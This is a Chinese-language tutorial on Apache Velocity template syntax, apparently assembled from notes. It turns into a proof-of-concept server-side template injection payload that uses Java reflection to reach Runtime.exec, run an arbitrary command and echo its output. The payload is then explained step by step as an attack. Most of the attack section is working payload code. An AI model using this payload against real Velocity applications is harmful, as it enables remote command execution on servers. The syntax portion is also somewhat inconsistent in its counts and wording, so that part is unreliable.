#表示符
"#"用来标识Velocity的脚本语句，包括#set、#if 、#else、#end、#foreach、#end、#iinclude、#parse、#macro等；
如:
#if($info.imgs)
<img src="$info.imgs" border=0>
#else
<img src="noPhoto.jpg">
#end

$表示符
"$"用来标识一个对象(或理解为变量)；如
如：$i、$msg、$TagUtil.options(...)等。

{} 标识符
"{}"用来明确标识Velocity变量；
比如在页面中，页面中有一个$someonename，此时，Velocity将把someonename作为变量名，若我们程序是想在someone这个变量的后面紧接着显示name字符，则上面的标签应该改成${someone}name。

！标识符
"!"用来强制把不存在的变量显示为空白。
如当页面中包含$msg，如果msg对象有值，将显示msg的值，如果不存在msg对象同，则在页面中将显示$msg字符。这是我们不希望的，为了把不存在的变量或变量值为null的对象显示为空白，则只需要在变量名前加一个“!”号即可。
如：$!msg
我们提供了五条基本的模板脚本语句，基本上就能满足所有应用模板的要求。这四条模板语句很简单，可以直接由界面设计人员来添加。在当前很多EasyJWeb的应用实践中，我们看到，所有界面模板中归纳起来只有下面四种简单模板脚本语句即可实现：
　　 1、$!obj 　直接返回对象结果。
　　 如：在html标签中显示java对象msg的值。
     2、#if($!obj) #else #end 判断语句
　　 如：在EasyJWeb各种开源应用中，我们经常看到的用于弹出提示信息msg的例子。



```POC
#set($run=$engine.getClass().forName("java.lang.Runtime"))
#set($runtime=$run.getRuntime())
#set($proc=$runtime.exec("COMMAND"))
#set($null=$proc.waitFor())
#set($istr=$proc.getInputStream())
#set($chr=$engine.getClass().forName("java.lang.Character"))
#set($output="")
#set($string=$engine.getClass().forName("java.lang.String"))
#foreach($i in [1..$istr.available()])
#set($output=$output.concat($string.valueOf($chr.toChars($istr.read()))))
#end
$output
```
流程分解
#1：获取Runtime类访问权
```velocity
#set($run=$engine.getClass().forName("java.lang.Runtime"))
```
#2：创建Runtime实例
```velocity
#set($runtime=$run.getRuntime())
```
#3：执行系统命令
```velocity
#set($proc=$runtime.exec("COMMAND"))
```
#4：同步等待执行完成
```velocity
#set($null=$proc.waitFor())
```
#5：建立输出捕获通道
```velocity
#set($istr=$proc.getInputStream())
```

#6：准备字符编码处理
```velocity
#set($chr=$engine.getClass().forName("java.lang.Character"))
#set($string=$engine.getClass().forName("java.lang.String"))
```
  - Character：字节到字符转换
  - String：字符串拼接操作

#7：循环读取命令输出
```velocity
#set($output="")
#foreach($i in [1..$istr.available()])
#set($output=$output.concat($string.valueOf($chr.toChars($istr.read()))))
#end
```
#8：回显攻击结果
```velocity
$output
```
